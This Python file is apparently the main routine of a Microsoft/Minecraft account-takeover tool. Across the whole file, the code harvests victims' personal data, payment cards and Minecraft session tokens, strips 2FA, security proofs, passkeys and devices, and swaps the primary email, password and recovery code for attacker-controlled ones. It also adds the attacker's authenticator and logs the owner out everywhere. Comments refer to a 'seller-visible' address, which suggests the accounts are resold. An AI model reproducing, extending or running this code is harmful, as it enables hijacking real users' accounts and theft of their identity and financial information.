from securing.utils.security.change_primary_alias import change_primary_alias
from securing.utils.security.get_security_mail import get_security_email
from securing.utils.security.add_authenticator import add_authenticator
from securing.utils.security.get_recovery_code import get_recovery_code
from securing.utils.security_information import security_information
from securing.utils.security.remove_services import remove_services
from securing.utils.security.remove_devices import remove_devices
from securing.utils.security.delete_aliases import delete_aliases
from securing.utils.security.remove_proof import remove_proof
from securing.utils.security.remove_zyger import remove_zyger
from securing.utils.security.remove_2fa import remove_2fa
from securing.utils.security.recovery import recover

from securing.utils.ogi.get_subscriptions import get_subscriptions
from securing.utils.ogi.get_owner_info import get_owner_info
from securing.utils.ogi.get_contacts import get_contacts
from securing.utils.ogi.get_devices import get_devices
from securing.utils.ogi.get_family import get_family
from securing.utils.ogi.get_cards import get_cards

from securing.utils.cookies.get_cookies import get_cookies
from securing.utils.cookies.get_amrp import get_amrp
from securing.utils.cookies.get_amc import get_amc
from securing.utils.cookies.get_t import get_t
from securing.utils.cookies.safe_cookies import iter_cookies

from securing.utils.security.logout_all import logout_all

from minecraft.get_profile import get_profile
from minecraft.get_ssid import get_ssid

from minecraft.get_namechange import get_username_info
from minecraft.get_method import get_method
from minecraft.get_capes import get_capes
from minecraft.get_xbl import get_xbl

from database.database import DBConnection
import asyncio
import httpx
import uuid
import json
import logging

log = logging.getLogger(__name__)

MC_CHECK_FAILED_LABEL = "Unknown (MC check failed)"


def _copy_cookies(src: httpx.AsyncClient) -> httpx.Cookies:
    """Copy auth cookies into a new jar (avoids sharing the proxied transport).

    Critically preserves ``__Host-MSAAUTH`` / ``__Secure-*`` host-only + Secure
    flags. A naive ``Cookies.set(..., domain=...)`` drop of ``secure`` causes
    Xbox sisu SSO to land on a login HTML page (no Location) → false MC-check fails.
    """
    from http.cookiejar import Cookie as JarCookie

    jar = httpx.Cookies()
    for c in iter_cookies(src):
        secure = bool(getattr(c, "secure", False)) or c.name.startswith(
            ("__Host-", "__Secure-")
        )
        domain = c.domain or ""
        # __Host- cookies must not carry a Domain attribute
        if c.name.startswith("__Host-"):
            domain = ""
            domain_specified = False
            domain_initial_dot = False
            secure = True
        else:
            domain_specified = bool(getattr(c, "domain_specified", bool(domain)))
            domain_initial_dot = domain.startswith(".") if domain else False
        try:
            jar.jar.set_cookie(
                JarCookie(
                    version=0,
                    name=c.name,
                    value=c.value,
                    port=None,
                    port_specified=False,
                    domain=domain,
                    domain_specified=domain_specified,
                    domain_initial_dot=domain_initial_dot,
                    path=c.path or "/",
                    path_specified=True,
                    secure=secure,
                    expires=getattr(c, "expires", None),
                    discard=True,
                    comment=None,
                    comment_url=None,
                    rest={"HttpOnly": None},
                    rfc2109=False,
                )
            )
        except Exception:
            try:
                jar.set(c.name, c.value, domain=domain or None, path=c.path or "/")
            except Exception:
                jar.set(c.name, c.value)
    return jar


async def _direct_xbl_client(session: httpx.AsyncClient) -> httpx.AsyncClient:
    """Non-proxied client for Xbox/Minecraft SSO — proxy often kills sisu.xboxlive.com."""
    headers = {
        "User-Agent": session.headers.get(
            "User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    return httpx.AsyncClient(
        cookies=_copy_cookies(session),
        headers=headers,
        timeout=httpx.Timeout(45.0, connect=20.0),
        follow_redirects=False,
        # Explicit: never inherit the secure session's proxy
        proxy=None,
        http2=False,
    )


async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> str:
    """Populate account_info['minecraft']. Returns outcome:
    'ok' | 'no_java' | 'no_mc' | 'transient'
    """
    print("[~] - Checking Minecraft Account (XBL via direct connection)")
    xbl_client = await _direct_xbl_client(session)
    try:
        XBLResponse = await get_xbl(xbl_client)
    finally:
        await xbl_client.aclose()

    if not XBLResponse:
        print("[x] - Failed to get XBL (network/auth race — NOT marking as no MC)")
        account_info["minecraft"]["name"] = MC_CHECK_FAILED_LABEL
        account_info["minecraft"]["method"] = "Unknown (MC check failed)"
        return "transient"

    print("[+] - Got XBL (Has Xbox Profile)")
    xbl = XBLResponse["xbl"]
    gtg = XBLResponse.get("gtg")
    if gtg:
        account_info["minecraft"]["gamertag"] = gtg

    ssid = await get_ssid(xbl)
    if not ssid:
        # XBL worked but SSID failed — often rate-limit / auth race, not "no MC"
        print("[x] - Failed to get SSID (retryable — NOT marking as no MC)")
        if gtg:
            account_info["minecraft"]["name"] = f"{gtg} (MC check failed)"
        else:
            account_info["minecraft"]["name"] = MC_CHECK_FAILED_LABEL
        account_info["minecraft"]["method"] = "Unknown (MC check failed)"
        return "transient"

    print("[+] - Got SSID! (Has Minecraft)")
    account_info["minecraft"]["SSID"] = ssid

    try:
        capes = await get_capes(ssid)
    except Exception:
        capes = []
    if capes:
        account_info["minecraft"]["capes"] = ", ".join(
            i.get("alias", i.get("id", "Unknown")) for i in capes
        )
        print("[+] - Got capes")
    else:
        account_info["minecraft"]["capes"] = "No capes"

    profile = await get_profile(ssid)
    if profile:
        print("[+] - Got profile (Has Minecraft Java)")
        account_info["minecraft"]["name"] = profile

        try:
            usernameInfo = await get_username_info(ssid)
        except Exception:
            usernameInfo = False
        if not usernameInfo:
            account_info["minecraft"]["uchange"] = "Yes"
        else:
            account_info["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"
    else:
        print("[x] - No Java profile (Bedrock/Game Pass only)")
        account_info["minecraft"]["name"] = f"{gtg} (No Java)" if gtg else "Owned — No Java Profile"
        account_info["minecraft"]["uchange"] = "N/A"

    method = await get_method(ssid)
    if method:
        account_info["minecraft"]["method"] = method
        print("[+] - Got purchase method")

    return "ok" if profile else "no_java"


async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, account_info: dict):
    # Main file where all processes to securing the account occur

    # To auto update if you edit the config via command
    config = json.load(open("config/config.json", "r"))
    replace_alias = config["autosecure"]["replace_main_alias"]
    enable_2fa = config["autosecure"]["enable_2fa"]
    minecon = config["autosecure"]["minecon_mode"] and not command
    domain = config["domain"]
    
    # Token needed to make API requests for the account
    try:
        verification_tokens = await get_amc(session)
    except Exception as exc:
        log.exception("get_amc failed")
        print(f"[X] - get_amc failed: {exc}")
        raise

    apicanary = await get_cookies(session)

    try:
        t = await get_t(session)
        if t:
            await get_amrp(session, t)
            print(f"[+] - Got T / AMRP")
        else:
            print("[!] - No classic login t token (already signed in) — skipping AMRP")
    except Exception as exc:
        log.warning("get_t/amrp failed — continuing with existing session: %s", exc)
        print(f"[!] - get_t/AMRP skipped ({exc.__class__.__name__}) — continuing")


    # Minecraft checking — retry when XBL/SSID fail (rate limit / parse race).
    # Never label transient failures as "No Minecraft" — that was a false negative
    # when VaultProxies killed sisu.xboxlive.com connections.
    mc_attempts = 6
    for attempt in range(1, mc_attempts + 1):
        outcome = await _check_minecraft(session, account_info)
        if outcome != "transient":
            break
        if attempt < mc_attempts:
            # 429 from login_with_xbox needs longer gaps under bulk parallel load
            delay = min(10.0 * attempt, 45.0)
            print(f"[~] - MC check inconclusive (attempt {attempt}/{mc_attempts}), retrying in {delay:.0f}s...")
            log.warning("MC check transient failure attempt %s/%s — sleeping %.1fs", attempt, mc_attempts, delay)
            await asyncio.sleep(delay)
        else:
            print(f"[x] - MC check still failed after retries — keeping '{account_info['minecraft'].get('name')}'")
            if account_info["minecraft"].get("name") in (None, "", "No Minecraft"):
                account_info["minecraft"]["name"] = MC_CHECK_FAILED_LABEL
            if account_info["minecraft"].get("method") in (None, "", "Not purchased"):
                account_info["minecraft"]["method"] = "Unknown (MC check failed)"
            log.error(
                "MC check failed after %s attempts for %s (gamertag=%s) — NOT confirming no MC",
                mc_attempts,
                account_info.get("microsoft", {}).get("email"),
                account_info["minecraft"].get("gamertag"),
            )

    # Gets account info via microsofts API
    subscriptions = await get_subscriptions(session, verification_tokens["home"])
    family = await get_family(session, verification_tokens["home"])
    devices = await get_devices(session, verification_tokens["home"])
    cards = await get_cards(session, verification_tokens["home"])
    contacts = await get_contacts(session, verification_tokens["home"])

    owner_info = await get_owner_info(session, verification_tokens["profile"])
    if not isinstance(owner_info, dict):
        owner_info = {}
    # Profile API often 401s when MSAL silent bridge never finishes — JWT still
    # has given_name / family_name / birthdate / ctry (dona-era accounts too).
    if not owner_info.get("firstName") and not owner_info.get("signInEmail"):
        from securing.utils.ogi.owner_from_jwt import owner_info_from_amc_jwt

        jwt_info = owner_info_from_amc_jwt(session)
        if jwt_info:
            owner_info = {**jwt_info, **{k: v for k, v in owner_info.items() if v}}
    if not isinstance(contacts, dict):
        contacts = {}
    if not isinstance(family, dict):
        family = {}
    if not isinstance(devices, dict):
        devices = {}
    if not isinstance(cards, dict):
        cards = {}
    if not isinstance(subscriptions, dict):
        subscriptions = {}

    print("[+] - Got DOB (Subscriptions, Family, Devices, Card...)")
    account_info["microsoft"]["firstName"] = owner_info.get("firstName") or "Failed to Get"
    account_info["microsoft"]["lastName"] = owner_info.get("lastName") or "Failed to Get"
    account_info["microsoft"]["fullName"] = owner_info.get("fullName") or "Failed to Get"
    account_info["microsoft"]["region"] = owner_info.get("region") or "Failed to Get"
    account_info["microsoft"]["birthday"] = owner_info.get("birthday") or "Failed to Get"
    account_info["microsoft"]["language"] = owner_info.get("msaDisplayLanguage") or "Failed to Get"
    account_info["microsoft"]["phones"] = (
        (contacts.get("msaPhones") or []) + (contacts.get("mmxPhones") or [])
    )

    account_info["microsoft"]["family"] = family.get("members") or []
    account_info["microsoft"]["devices"] = devices.get("devices") or []
    account_info["microsoft"]["cards"] = cards.get("paymentInstruments") or []
    account_info["microsoft"]["subscriptions"] = {
        "active":     subscriptions.get("active") or [],
        "canceled":   subscriptions.get("canceled") or [],
        "commercial": subscriptions.get("commercial") or [],
    }
    
    await get_amrp(session, t)
    print(f"[+] - Got AMRP")

    # 2FA
    await remove_2fa(session, apicanary)

    ms = account_info.get("microsoft") or {}
    existing_recovery = ms.get("recovery_code")
    has_recovery = bool(
        existing_recovery and existing_recovery not in ("Couldn't Change!", "Failed to generate")
    )

    security_parameters = None
    try:
        # After recover we already have password + recovery. Skip proofs OTP only when
        # we are NOT changing primary alias — names/manage needs SA elevation (i5600).
        security_parameters = json.loads(
            await security_information(
                session,
                security_email=ms.get("security_email"),
                account_email=ms.get("email"),
                password=ms.get("password"),
                skip_i5600_otp=has_recovery and not replace_alias,
            )
        )
    except RuntimeError as exc:
        # i5600 "Help us protect" often blocks proofs/Manage after recover already
        # succeeded. Soft-continue so the hit is not lost — keep recovery code,
        # still run MC / API cleanup that does not need t0.
        msg = str(exc)
        if has_recovery and (
            "could not find var t0" in msg
            or "i5600" in msg
            or "proofs page" in msg
        ):
            log.warning(
                "security_information soft-skip after recover for %s: %s",
                ms.get("email"),
                msg[:300],
            )
            print(
                "[!] - Proofs MFA blocked (i5600) — continuing with existing recovery "
                "(skipping proofs/Manage t0)"
            )
            security_parameters = None
        else:
            raise

    main_email = None
    if security_parameters:
        main_email = security_parameters.get("email") or account_info["microsoft"].get("email")
    else:
        main_email = account_info["microsoft"].get("email")
    # Seed primary immediately so partial failures still show the real address
    if main_email and main_email != "Couldn't Change!":
        account_info["microsoft"]["email"] = main_email
        # Freeze seller-visible address before any primary alias replace
        if not account_info["microsoft"].get("original_email"):
            account_info["microsoft"]["original_email"] = main_email
    print(f"[+] - Got Security Parameters (primary={account_info['microsoft']['email']})")

    encryptedNetID = None
    if security_parameters:
        try:
            encryptedNetID = security_parameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
        except (KeyError, TypeError):
            encryptedNetID = None
            log.warning("security_parameters missing manageProofs.encryptedNetId")

    if recovery or not has_recovery:
        generated_code = None
        if encryptedNetID:
            generated_code = await get_recovery_code(
                session,
                apicanary,
                encryptedNetID
            )
        if generated_code:
            recovery_code = generated_code
        elif has_recovery:
            recovery_code = existing_recovery
        else:
            recovery_code = "Failed to generate"
            print("[X] - Failed to generate recovery code")
    else:
        recovery_code = existing_recovery
        print(f"[+] - Keeping existing recovery code from recovery flow")

    print(f"[+] - Got Recovery Code | {recovery_code}")

    if minecon:
        account_info["microsoft"]["email"] = main_email or account_info["microsoft"]["email"]
        account_info["microsoft"]["password"] = "Unknown"
        account_info["microsoft"]["recovery_code"] = recovery_code

        # Get security mail
        security_email = await get_security_email(session)
        account_info["microsoft"]["security_email"] = security_email
        print(f"[+] - Got Security Email | {security_email}")
    else:
        account_info["microsoft"]["recovery_code"] = recovery_code

    if not minecon:

        # Pass Keys / Windows Hello Exploit
        await remove_zyger(session, apicanary)

        # Removes security_emails / Auth Apps
        await remove_proof(session, apicanary)
        print("[+] - Removed all Proofs")

        # Third Party Launchers (Minecraft, Prism)
        await remove_services(session)

        # Remove Microsoft Devices
        await remove_devices(session, verification_tokens["devices"], devices)

        # Seed login email before alias replace (updated only if MakePrimary wins)
        if main_email:
            account_info["microsoft"]["email"] = main_email

        # Primary alias replace does NOT require security_parameters / t0 —
        # only apicanary + names/manage session (dona-fork flow).
        if replace_alias:
            print("[~] - Changing Primary Alias")
            primaryEmail = f"sunny{uuid.uuid4().hex[:12]}"
            ms = account_info.get("microsoft") or {}
            # Preserve seller-visible original before promote
            if not ms.get("original_email"):
                ms["original_email"] = ms.get("email") or main_email
                account_info["microsoft"] = ms
            changed = await change_primary_alias(
                session,
                primaryEmail,
                apicanary,
                security_email=ms.get("security_email"),
                account_email=ms.get("original_email") or ms.get("email") or main_email,
                password=ms.get("password"),
            )
            if changed:
                account_info["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
            else:
                kept = account_info["microsoft"]["email"]
                print(f"[X] - Failed to change Primary Email (keeping {kept})")

        if security_parameters:
            if recovery:

                security_email = uuid.uuid4().hex[:16]
                from securing.utils.security.password_gen import generate_ms_password
                password = generate_ms_password(14)

                security_email = f"{security_email}@{domain}"
                print(f"[+] - Generated Security Email ({security_email})")
                with DBConnection() as database:
                    database.add_security_email(security_email, password)

                # Changes password & generate a new recovery code
                print(f"[~] - Automaticly Securing Account... ({main_email})")
                data = await recover(session, main_email, recovery_code, security_email, password)

                if data and data != "invalid":
                    account_info["microsoft"]["security_email"] = security_email
                    account_info["microsoft"]["recovery_code"] = data
                    account_info["microsoft"]["password"] = password
                else:
                    print(f"[X] - Failed to secure this account")

        # Delete other login aliases (non-fatal — manage page often lacks canary)
        # Always keep the current primary so a failed MakePrimary doesn't orphan-delete
        # a freshly added sunny* alias (previous bug).
        try:
            await delete_aliases(
                session,
                keep_email=account_info["microsoft"].get("email"),
            )
        except Exception as exc:
            logging.warning("delete_aliases soft-skip: %s", exc)
            print(f"[~] - Skipping alias removal ({exc.__class__.__name__})")

        # Add Authenticator
        if enable_2fa:
            auth = await add_authenticator(session)
            account_info["microsoft"]["auth_secret"] = auth
            print(f"[+] - Added Authenticator ({auth})")

        # Logout all devices
        await logout_all(session, apicanary)
        
    print("[+] - Account has been secured")
    return account_info